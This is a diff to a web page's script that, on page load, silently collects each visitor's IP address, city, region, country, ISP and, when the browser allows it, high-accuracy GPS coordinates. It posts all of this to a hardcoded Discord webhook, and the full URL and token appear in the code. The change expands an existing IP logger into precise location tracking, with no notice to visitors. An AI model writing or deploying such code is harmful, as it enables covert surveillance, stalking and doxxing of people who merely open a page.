@@ -37,14 +37,40 @@
   </div>
 
   <script>
-    // ================== CHANGE THIS ==================
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1516409431368269934/4qmFB9N79B2tVd0xWvh221dwRWNZ6gAJBwmrWW1nlKP_FkAA2JohWRG4G4RU-n8k_e_X";
 
     async function sendVisitorInfo() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
+      let geoData = {};
+      let ipData = {};
 
+      // 1. Try Browser Geolocation (more accurate)
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            timeout: 8000,
+            enableHighAccuracy: true
+          });
+        });
+
+        geoData = {
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        };
+      } catch (e) {
+        console.log("Geolocation denied or failed");
+      }
+
+      // 2. Always get IP + city level info as fallback
+      try {
+        const res = await fetch('https://ip-api.com/json/?fields=status,message,query,country,regionName,city,lat,lon,isp');
+        ipData = await res.json();
+      } catch (e) {
+        console.log("IP lookup failed");
+      }
+
+      // Send to Discord
+      try {
         await fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -54,20 +80,26 @@
               title: "Visitor Details",
               color: 0x3498db,
               fields: [
-                { name: "IP", value: data.ip || "Unknown", inline: true },
-                { name: "Location", value: `${data.city || 'Unknown'}, ${data.country_name || ''}`, inline: true },
-                { name: "Time", value: new Date().toLocaleString(), inline: false },
-                { name: "Device", value: navigator.userAgent.substring(0, 80) + "...", inline: false }
+                { name: "IP Address", value: ipData.query || "Unknown", inline: true },
+                { name: "City", value: ipData.city || "Unknown", inline: true },
+                { name: "Region", value: ipData.regionName || "Unknown", inline: true },
+                { name: "Country", value: ipData.country || "Unknown", inline: true },
+                { name: "GPS Coordinates", value: geoData.lat ? `${geoData.lat.toFixed(4)}, ${geoData.lon.toFixed(4)}` : "Not granted", inline: false },
+                { name: "ISP", value: ipData.isp || "Unknown", inline: false },
+                { name: "Time", value: new Date().toLocaleString(), inline: false }
               ]
             }]
           })
         });
       } catch (e) {
-        console.log("Error");
+        console.log("Webhook error");
       }
     }
 
-    window.onload = () => setTimeout(sendVisitorInfo, 700);
+    // Run after page loads
+    window.onload = () => {
+      setTimeout(sendVisitorInfo, 800);
+    };
   </script>
 </body>
 </html>
